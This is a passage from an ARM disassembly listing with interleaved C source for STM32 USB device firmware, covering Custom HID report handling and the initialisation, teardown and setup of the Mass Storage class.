  ((USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId])->state = CUSTOM_HID_IDLE;
 8008bdc:	687b      	ldr	r3, [r7, #4]
 8008bde:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008be2:	687b      	ldr	r3, [r7, #4]
 8008be4:	32b0      	adds	r2, #176	; 0xb0
 8008be6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008bea:	2200      	movs	r2, #0
 8008bec:	f883 2020 	strb.w	r2, [r3, #32]

  return (uint8_t)USBD_OK;
 8008bf0:	2300      	movs	r3, #0
}
 8008bf2:	4618      	mov	r0, r3
 8008bf4:	370c      	adds	r7, #12
 8008bf6:	46bd      	mov	sp, r7
 8008bf8:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008bfc:	4770      	bx	lr

08008bfe <USBD_CUSTOM_HID_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008bfe:	b580      	push	{r7, lr}
 8008c00:	b084      	sub	sp, #16
 8008c02:	af00      	add	r7, sp, #0
 8008c04:	6078      	str	r0, [r7, #4]
 8008c06:	460b      	mov	r3, r1
 8008c08:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008c0a:	687b      	ldr	r3, [r7, #4]
 8008c0c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c10:	687b      	ldr	r3, [r7, #4]
 8008c12:	32b0      	adds	r2, #176	; 0xb0
 8008c14:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c18:	2b00      	cmp	r3, #0
 8008c1a:	d101      	bne.n	8008c20 <USBD_CUSTOM_HID_DataOut+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008c1c:	2303      	movs	r3, #3
 8008c1e:	e017      	b.n	8008c50 <USBD_CUSTOM_HID_DataOut+0x52>
  }

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008c20:	687b      	ldr	r3, [r7, #4]
 8008c22:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c26:	687b      	ldr	r3, [r7, #4]
 8008c28:	32b0      	adds	r2, #176	; 0xb0
 8008c2a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c2e:	60fb      	str	r3, [r7, #12]

  /* USB data will be immediately processed, this allow next USB traffic being
  NAKed till the end of the application processing */
  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008c30:	687b      	ldr	r3, [r7, #4]
 8008c32:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008c36:	687a      	ldr	r2, [r7, #4]
 8008c38:	33b0      	adds	r3, #176	; 0xb0
 8008c3a:	009b      	lsls	r3, r3, #2
 8008c3c:	4413      	add	r3, r2
 8008c3e:	685b      	ldr	r3, [r3, #4]
 8008c40:	68db      	ldr	r3, [r3, #12]
 8008c42:	68fa      	ldr	r2, [r7, #12]
 8008c44:	7810      	ldrb	r0, [r2, #0]
 8008c46:	68fa      	ldr	r2, [r7, #12]
 8008c48:	7852      	ldrb	r2, [r2, #1]
 8008c4a:	4611      	mov	r1, r2
 8008c4c:	4798      	blx	r3
                                                                           hhid->Report_buf[1]);

  return (uint8_t)USBD_OK;
 8008c4e:	2300      	movs	r3, #0
}
 8008c50:	4618      	mov	r0, r3
 8008c52:	3710      	adds	r7, #16
 8008c54:	46bd      	mov	sp, r7
 8008c56:	bd80      	pop	{r7, pc}

08008c58 <USBD_CUSTOM_HID_ReceivePacket>:
  *         prepare OUT Endpoint for reception
  * @param  pdev: device instance
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_ReceivePacket(USBD_HandleTypeDef *pdev)
{
 8008c58:	b580      	push	{r7, lr}
 8008c5a:	b084      	sub	sp, #16
 8008c5c:	af00      	add	r7, sp, #0
 8008c5e:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008c60:	687b      	ldr	r3, [r7, #4]
 8008c62:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c66:	687b      	ldr	r3, [r7, #4]
 8008c68:	32b0      	adds	r2, #176	; 0xb0
 8008c6a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c6e:	2b00      	cmp	r3, #0
 8008c70:	d101      	bne.n	8008c76 <USBD_CUSTOM_HID_ReceivePacket+0x1e>
  {
    return (uint8_t)USBD_FAIL;
 8008c72:	2303      	movs	r3, #3
 8008c74:	e01c      	b.n	8008cb0 <USBD_CUSTOM_HID_ReceivePacket+0x58>
#ifdef USE_USBD_COMPOSITE
  /* Get OUT Endpoint address allocated for this class instance */
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008c76:	687b      	ldr	r3, [r7, #4]
 8008c78:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c7c:	687b      	ldr	r3, [r7, #4]
 8008c7e:	32b0      	adds	r2, #176	; 0xb0
 8008c80:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c84:	60fb      	str	r3, [r7, #12]

  /* Resume USB Out process */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008c86:	4b0c      	ldr	r3, [pc, #48]	; (8008cb8 <USBD_CUSTOM_HID_ReceivePacket+0x60>)
 8008c88:	7819      	ldrb	r1, [r3, #0]
 8008c8a:	68fa      	ldr	r2, [r7, #12]
 8008c8c:	230f      	movs	r3, #15
 8008c8e:	6878      	ldr	r0, [r7, #4]
 8008c90:	f004 f920 	bl	800ced4 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);

  if(((recv_buffer[0]=(hhid->Report_buf[0]))&0x02) != 0x02){
 8008c94:	68fb      	ldr	r3, [r7, #12]
 8008c96:	781a      	ldrb	r2, [r3, #0]
 8008c98:	4b08      	ldr	r3, [pc, #32]	; (8008cbc <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008c9a:	701a      	strb	r2, [r3, #0]
 8008c9c:	4b07      	ldr	r3, [pc, #28]	; (8008cbc <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008c9e:	781b      	ldrb	r3, [r3, #0]
 8008ca0:	f003 0302 	and.w	r3, r3, #2
 8008ca4:	2b02      	cmp	r3, #2
 8008ca6:	d002      	beq.n	8008cae <USBD_CUSTOM_HID_ReceivePacket+0x56>
	  InterruptFlag = 1;
 8008ca8:	4b05      	ldr	r3, [pc, #20]	; (8008cc0 <USBD_CUSTOM_HID_ReceivePacket+0x68>)
 8008caa:	2201      	movs	r2, #1
 8008cac:	601a      	str	r2, [r3, #0]
  }
  return (uint8_t)USBD_OK;
 8008cae:	2300      	movs	r3, #0
}
 8008cb0:	4618      	mov	r0, r3
 8008cb2:	3710      	adds	r7, #16
 8008cb4:	46bd      	mov	sp, r7
 8008cb6:	bd80      	pop	{r7, pc}
 8008cb8:	200000a7 	.word	0x200000a7
 8008cbc:	2000026c 	.word	0x2000026c
 8008cc0:	20000270 	.word	0x20000270

08008cc4 <USBD_CUSTOM_HID_EP0_RxReady>:
  *         Handles control request data.
  * @param  pdev: device instance
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_EP0_RxReady(USBD_HandleTypeDef *pdev)
{
 8008cc4:	b580      	push	{r7, lr}
 8008cc6:	b084      	sub	sp, #16
 8008cc8:	af00      	add	r7, sp, #0
 8008cca:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008ccc:	687b      	ldr	r3, [r7, #4]
 8008cce:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008cd2:	687b      	ldr	r3, [r7, #4]
 8008cd4:	32b0      	adds	r2, #176	; 0xb0
 8008cd6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008cda:	60fb      	str	r3, [r7, #12]

  if (hhid == NULL)
 8008cdc:	68fb      	ldr	r3, [r7, #12]
 8008cde:	2b00      	cmp	r3, #0
 8008ce0:	d101      	bne.n	8008ce6 <USBD_CUSTOM_HID_EP0_RxReady+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008ce2:	2303      	movs	r3, #3
 8008ce4:	e016      	b.n	8008d14 <USBD_CUSTOM_HID_EP0_RxReady+0x50>
  }

  if (hhid->IsReportAvailable == 1U)
 8008ce6:	68fb      	ldr	r3, [r7, #12]
 8008ce8:	69db      	ldr	r3, [r3, #28]
 8008cea:	2b01      	cmp	r3, #1
 8008cec:	d111      	bne.n	8008d12 <USBD_CUSTOM_HID_EP0_RxReady+0x4e>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008cee:	687b      	ldr	r3, [r7, #4]
 8008cf0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008cf4:	687a      	ldr	r2, [r7, #4]
 8008cf6:	33b0      	adds	r3, #176	; 0xb0
 8008cf8:	009b      	lsls	r3, r3, #2
 8008cfa:	4413      	add	r3, r2
 8008cfc:	685b      	ldr	r3, [r3, #4]
 8008cfe:	68db      	ldr	r3, [r3, #12]
 8008d00:	68fa      	ldr	r2, [r7, #12]
 8008d02:	7810      	ldrb	r0, [r2, #0]
 8008d04:	68fa      	ldr	r2, [r7, #12]
 8008d06:	7852      	ldrb	r2, [r2, #1]
 8008d08:	4611      	mov	r1, r2
 8008d0a:	4798      	blx	r3
                                                                             hhid->Report_buf[1]);
    hhid->IsReportAvailable = 0U;
 8008d0c:	68fb      	ldr	r3, [r7, #12]
 8008d0e:	2200      	movs	r2, #0
 8008d10:	61da      	str	r2, [r3, #28]
  }

  return (uint8_t)USBD_OK;
 8008d12:	2300      	movs	r3, #0
}
 8008d14:	4618      	mov	r0, r3
 8008d16:	3710      	adds	r7, #16
 8008d18:	46bd      	mov	sp, r7
 8008d1a:	bd80      	pop	{r7, pc}

08008d1c <USBD_CUSTOM_HID_GetDeviceQualifierDesc>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetDeviceQualifierDesc(uint16_t *length)
{
 8008d1c:	b480      	push	{r7}
 8008d1e:	b083      	sub	sp, #12
 8008d20:	af00      	add	r7, sp, #0
 8008d22:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_DeviceQualifierDesc);
 8008d24:	687b      	ldr	r3, [r7, #4]
 8008d26:	220a      	movs	r2, #10
 8008d28:	801a      	strh	r2, [r3, #0]

  return USBD_CUSTOM_HID_DeviceQualifierDesc;
 8008d2a:	4b03      	ldr	r3, [pc, #12]	; (8008d38 <USBD_CUSTOM_HID_GetDeviceQualifierDesc+0x1c>)
}
 8008d2c:	4618      	mov	r0, r3
 8008d2e:	370c      	adds	r7, #12
 8008d30:	46bd      	mov	sp, r7
 8008d32:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008d36:	4770      	bx	lr
 8008d38:	2000009c 	.word	0x2000009c

08008d3c <USBD_CUSTOM_HID_RegisterInterface>:
  * @param  fops: CUSTOMHID Interface callback
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_RegisterInterface(USBD_HandleTypeDef *pdev,
                                          USBD_CUSTOM_HID_ItfTypeDef *fops)
{
 8008d3c:	b480      	push	{r7}
 8008d3e:	b083      	sub	sp, #12
 8008d40:	af00      	add	r7, sp, #0
 8008d42:	6078      	str	r0, [r7, #4]
 8008d44:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8008d46:	683b      	ldr	r3, [r7, #0]
 8008d48:	2b00      	cmp	r3, #0
 8008d4a:	d101      	bne.n	8008d50 <USBD_CUSTOM_HID_RegisterInterface+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8008d4c:	2303      	movs	r3, #3
 8008d4e:	e009      	b.n	8008d64 <USBD_CUSTOM_HID_RegisterInterface+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8008d50:	687b      	ldr	r3, [r7, #4]
 8008d52:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008d56:	687a      	ldr	r2, [r7, #4]
 8008d58:	33b0      	adds	r3, #176	; 0xb0
 8008d5a:	009b      	lsls	r3, r3, #2
 8008d5c:	4413      	add	r3, r2
 8008d5e:	683a      	ldr	r2, [r7, #0]
 8008d60:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 8008d62:	2300      	movs	r3, #0
}
 8008d64:	4618      	mov	r0, r3
 8008d66:	370c      	adds	r7, #12
 8008d68:	46bd      	mov	sp, r7
 8008d6a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008d6e:	4770      	bx	lr

08008d70 <USBD_MSC_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008d70:	b580      	push	{r7, lr}
 8008d72:	b084      	sub	sp, #16
 8008d74:	af00      	add	r7, sp, #0
 8008d76:	6078      	str	r0, [r7, #4]
 8008d78:	460b      	mov	r3, r1
 8008d7a:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_MSC_BOT_HandleTypeDef *hmsc;

  hmsc = (USBD_MSC_BOT_HandleTypeDef *)USBD_malloc_MSC(sizeof(USBD_MSC_BOT_HandleTypeDef));
 8008d7c:	f241 0074 	movw	r0, #4212	; 0x1074
 8008d80:	f004 f938 	bl	800cff4 <USBD_static_malloc_MSC>
 8008d84:	60f8      	str	r0, [r7, #12]

  if (hmsc == NULL)
 8008d86:	68fb      	ldr	r3, [r7, #12]
 8008d88:	2b00      	cmp	r3, #0
 8008d8a:	d109      	bne.n	8008da0 <USBD_MSC_Init+0x30>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008d8c:	687b      	ldr	r3, [r7, #4]
 8008d8e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d92:	687b      	ldr	r3, [r7, #4]
 8008d94:	32b0      	adds	r2, #176	; 0xb0
 8008d96:	2100      	movs	r1, #0
 8008d98:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 8008d9c:	2302      	movs	r3, #2
 8008d9e:	e06e      	b.n	8008e7e <USBD_MSC_Init+0x10e>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hmsc;
 8008da0:	687b      	ldr	r3, [r7, #4]
 8008da2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008da6:	687b      	ldr	r3, [r7, #4]
 8008da8:	32b0      	adds	r2, #176	; 0xb0
 8008daa:	68f9      	ldr	r1, [r7, #12]
 8008dac:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008db0:	687b      	ldr	r3, [r7, #4]
 8008db2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008db6:	687b      	ldr	r3, [r7, #4]
 8008db8:	32b0      	adds	r2, #176	; 0xb0
 8008dba:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008dbe:	687b      	ldr	r3, [r7, #4]
 8008dc0:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008dc4:	687b      	ldr	r3, [r7, #4]
 8008dc6:	7c1b      	ldrb	r3, [r3, #16]
 8008dc8:	2b00      	cmp	r3, #0
 8008dca:	d12b      	bne.n	8008e24 <USBD_MSC_Init+0xb4>
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008dcc:	4b2e      	ldr	r3, [pc, #184]	; (8008e88 <USBD_MSC_Init+0x118>)
 8008dce:	7819      	ldrb	r1, [r3, #0]
 8008dd0:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008dd4:	2202      	movs	r2, #2
 8008dd6:	6878      	ldr	r0, [r7, #4]
 8008dd8:	f003 feca 	bl	800cb70 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008ddc:	4b2a      	ldr	r3, [pc, #168]	; (8008e88 <USBD_MSC_Init+0x118>)
 8008dde:	781b      	ldrb	r3, [r3, #0]
 8008de0:	f003 020f 	and.w	r2, r3, #15
 8008de4:	6879      	ldr	r1, [r7, #4]
 8008de6:	4613      	mov	r3, r2
 8008de8:	009b      	lsls	r3, r3, #2
 8008dea:	4413      	add	r3, r2
 8008dec:	009b      	lsls	r3, r3, #2
 8008dee:	440b      	add	r3, r1
 8008df0:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008df4:	2201      	movs	r2, #1
 8008df6:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008df8:	4b24      	ldr	r3, [pc, #144]	; (8008e8c <USBD_MSC_Init+0x11c>)
 8008dfa:	7819      	ldrb	r1, [r3, #0]
 8008dfc:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008e00:	2202      	movs	r2, #2
 8008e02:	6878      	ldr	r0, [r7, #4]
 8008e04:	f003 feb4 	bl	800cb70 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008e08:	4b20      	ldr	r3, [pc, #128]	; (8008e8c <USBD_MSC_Init+0x11c>)
 8008e0a:	781b      	ldrb	r3, [r3, #0]
 8008e0c:	f003 020f 	and.w	r2, r3, #15
 8008e10:	6879      	ldr	r1, [r7, #4]
 8008e12:	4613      	mov	r3, r2
 8008e14:	009b      	lsls	r3, r3, #2
 8008e16:	4413      	add	r3, r2
 8008e18:	009b      	lsls	r3, r3, #2
 8008e1a:	440b      	add	r3, r1
 8008e1c:	3324      	adds	r3, #36	; 0x24
 8008e1e:	2201      	movs	r2, #1
 8008e20:	801a      	strh	r2, [r3, #0]
 8008e22:	e028      	b.n	8008e76 <USBD_MSC_Init+0x106>
  }
  else
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008e24:	4b18      	ldr	r3, [pc, #96]	; (8008e88 <USBD_MSC_Init+0x118>)
 8008e26:	7819      	ldrb	r1, [r3, #0]
 8008e28:	2340      	movs	r3, #64	; 0x40
 8008e2a:	2202      	movs	r2, #2
 8008e2c:	6878      	ldr	r0, [r7, #4]
 8008e2e:	f003 fe9f 	bl	800cb70 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008e32:	4b15      	ldr	r3, [pc, #84]	; (8008e88 <USBD_MSC_Init+0x118>)
 8008e34:	781b      	ldrb	r3, [r3, #0]
 8008e36:	f003 020f 	and.w	r2, r3, #15
 8008e3a:	6879      	ldr	r1, [r7, #4]
 8008e3c:	4613      	mov	r3, r2
 8008e3e:	009b      	lsls	r3, r3, #2
 8008e40:	4413      	add	r3, r2
 8008e42:	009b      	lsls	r3, r3, #2
 8008e44:	440b      	add	r3, r1
 8008e46:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008e4a:	2201      	movs	r2, #1
 8008e4c:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008e4e:	4b0f      	ldr	r3, [pc, #60]	; (8008e8c <USBD_MSC_Init+0x11c>)
 8008e50:	7819      	ldrb	r1, [r3, #0]
 8008e52:	2340      	movs	r3, #64	; 0x40
 8008e54:	2202      	movs	r2, #2
 8008e56:	6878      	ldr	r0, [r7, #4]
 8008e58:	f003 fe8a 	bl	800cb70 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008e5c:	4b0b      	ldr	r3, [pc, #44]	; (8008e8c <USBD_MSC_Init+0x11c>)
 8008e5e:	781b      	ldrb	r3, [r3, #0]
 8008e60:	f003 020f 	and.w	r2, r3, #15
 8008e64:	6879      	ldr	r1, [r7, #4]
 8008e66:	4613      	mov	r3, r2
 8008e68:	009b      	lsls	r3, r3, #2
 8008e6a:	4413      	add	r3, r2
 8008e6c:	009b      	lsls	r3, r3, #2
 8008e6e:	440b      	add	r3, r1
 8008e70:	3324      	adds	r3, #36	; 0x24
 8008e72:	2201      	movs	r2, #1
 8008e74:	801a      	strh	r2, [r3, #0]
  }

  /* Init the BOT  layer */
  MSC_BOT_Init(pdev);
 8008e76:	6878      	ldr	r0, [r7, #4]
 8008e78:	f000 fa2c 	bl	80092d4 <MSC_BOT_Init>

  return (uint8_t)USBD_OK;
 8008e7c:	2300      	movs	r3, #0
}
 8008e7e:	4618      	mov	r0, r3
 8008e80:	3710      	adds	r7, #16
 8008e82:	46bd      	mov	sp, r7
 8008e84:	bd80      	pop	{r7, pc}
 8008e86:	bf00      	nop
 8008e88:	2000010b 	.word	0x2000010b
 8008e8c:	2000010a 	.word	0x2000010a

08008e90 <USBD_MSC_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008e90:	b580      	push	{r7, lr}
 8008e92:	b082      	sub	sp, #8
 8008e94:	af00      	add	r7, sp, #0
 8008e96:	6078      	str	r0, [r7, #4]
 8008e98:	460b      	mov	r3, r1
 8008e9a:	70fb      	strb	r3, [r7, #3]
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close MSC EPs */
  (void)USBD_LL_CloseEP(pdev, MSCOutEpAdd);
 8008e9c:	4b26      	ldr	r3, [pc, #152]	; (8008f38 <USBD_MSC_DeInit+0xa8>)
 8008e9e:	781b      	ldrb	r3, [r3, #0]
 8008ea0:	4619      	mov	r1, r3
 8008ea2:	6878      	ldr	r0, [r7, #4]
 8008ea4:	f003 fea2 	bl	800cbec <USBD_LL_CloseEP>
  pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 0U;
 8008ea8:	4b23      	ldr	r3, [pc, #140]	; (8008f38 <USBD_MSC_DeInit+0xa8>)
 8008eaa:	781b      	ldrb	r3, [r3, #0]
 8008eac:	f003 020f 	and.w	r2, r3, #15
 8008eb0:	6879      	ldr	r1, [r7, #4]
 8008eb2:	4613      	mov	r3, r2
 8008eb4:	009b      	lsls	r3, r3, #2
 8008eb6:	4413      	add	r3, r2
 8008eb8:	009b      	lsls	r3, r3, #2
 8008eba:	440b      	add	r3, r1
 8008ebc:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008ec0:	2200      	movs	r2, #0
 8008ec2:	801a      	strh	r2, [r3, #0]

  /* Close EP IN */
  (void)USBD_LL_CloseEP(pdev, MSCInEpAdd);
 8008ec4:	4b1d      	ldr	r3, [pc, #116]	; (8008f3c <USBD_MSC_DeInit+0xac>)
 8008ec6:	781b      	ldrb	r3, [r3, #0]
 8008ec8:	4619      	mov	r1, r3
 8008eca:	6878      	ldr	r0, [r7, #4]
 8008ecc:	f003 fe8e 	bl	800cbec <USBD_LL_CloseEP>
  pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 0U;
 8008ed0:	4b1a      	ldr	r3, [pc, #104]	; (8008f3c <USBD_MSC_DeInit+0xac>)
 8008ed2:	781b      	ldrb	r3, [r3, #0]
 8008ed4:	f003 020f 	and.w	r2, r3, #15
 8008ed8:	6879      	ldr	r1, [r7, #4]
 8008eda:	4613      	mov	r3, r2
 8008edc:	009b      	lsls	r3, r3, #2
 8008ede:	4413      	add	r3, r2
 8008ee0:	009b      	lsls	r3, r3, #2
 8008ee2:	440b      	add	r3, r1
 8008ee4:	3324      	adds	r3, #36	; 0x24
 8008ee6:	2200      	movs	r2, #0
 8008ee8:	801a      	strh	r2, [r3, #0]

  /* Free MSC Class Resources */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8008eea:	687b      	ldr	r3, [r7, #4]
 8008eec:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008ef0:	687b      	ldr	r3, [r7, #4]
 8008ef2:	32b0      	adds	r2, #176	; 0xb0
 8008ef4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008ef8:	2b00      	cmp	r3, #0
 8008efa:	d018      	beq.n	8008f2e <USBD_MSC_DeInit+0x9e>
  {
    /* De-Init the BOT layer */
    MSC_BOT_DeInit(pdev);
 8008efc:	6878      	ldr	r0, [r7, #4]
 8008efe:	f000 fa6f 	bl	80093e0 <MSC_BOT_DeInit>

    (void)USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 8008f02:	687b      	ldr	r3, [r7, #4]
 8008f04:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f08:	687b      	ldr	r3, [r7, #4]
 8008f0a:	32b0      	adds	r2, #176	; 0xb0
 8008f0c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008f10:	4618      	mov	r0, r3
 8008f12:	f004 f87d 	bl	800d010 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId]  = NULL;
 8008f16:	687b      	ldr	r3, [r7, #4]
 8008f18:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f1c:	687b      	ldr	r3, [r7, #4]
 8008f1e:	32b0      	adds	r2, #176	; 0xb0
 8008f20:	2100      	movs	r1, #0
 8008f22:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 8008f26:	687b      	ldr	r3, [r7, #4]
 8008f28:	2200      	movs	r2, #0
 8008f2a:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 8008f2e:	2300      	movs	r3, #0
}
 8008f30:	4618      	mov	r0, r3
 8008f32:	3708      	adds	r7, #8
 8008f34:	46bd      	mov	sp, r7
 8008f36:	bd80      	pop	{r7, pc}
 8008f38:	2000010b 	.word	0x2000010b
 8008f3c:	2000010a 	.word	0x2000010a

08008f40 <USBD_MSC_Setup>:
  * @param  pdev: device instance
  * @param  req: USB request
  * @retval status
  */
uint8_t USBD_MSC_Setup(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 8008f40:	b580      	push	{r7, lr}
 8008f42:	b086      	sub	sp, #24
 8008f44:	af00      	add	r7, sp, #0
 8008f46:	6078      	str	r0, [r7, #4]
 8008f48:	6039      	str	r1, [r7, #0]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008f4a:	687b      	ldr	r3, [r7, #4]
 8008f4c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f50:	687b      	ldr	r3, [r7, #4]
 8008f52:	32b0      	adds	r2, #176	; 0xb0
 8008f54:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008f58:	613b      	str	r3, [r7, #16]
  USBD_StatusTypeDef ret = USBD_OK;
 8008f5a:	2300      	movs	r3, #0
 8008f5c:	75fb      	strb	r3, [r7, #23]
  uint16_t status_info = 0U;
 8008f5e:	2300      	movs	r3, #0
 8008f60:	81fb      	strh	r3, [r7, #14]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8008f62:	693b      	ldr	r3, [r7, #16]
 8008f64:	2b00      	cmp	r3, #0
 8008f66:	d101      	bne.n	8008f6c <USBD_MSC_Setup+0x2c>
  {
    return (uint8_t)USBD_FAIL;
 8008f68:	2303      	movs	r3, #3
 8008f6a:	e0e1      	b.n	8009130 <USBD_MSC_Setup+0x1f0>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
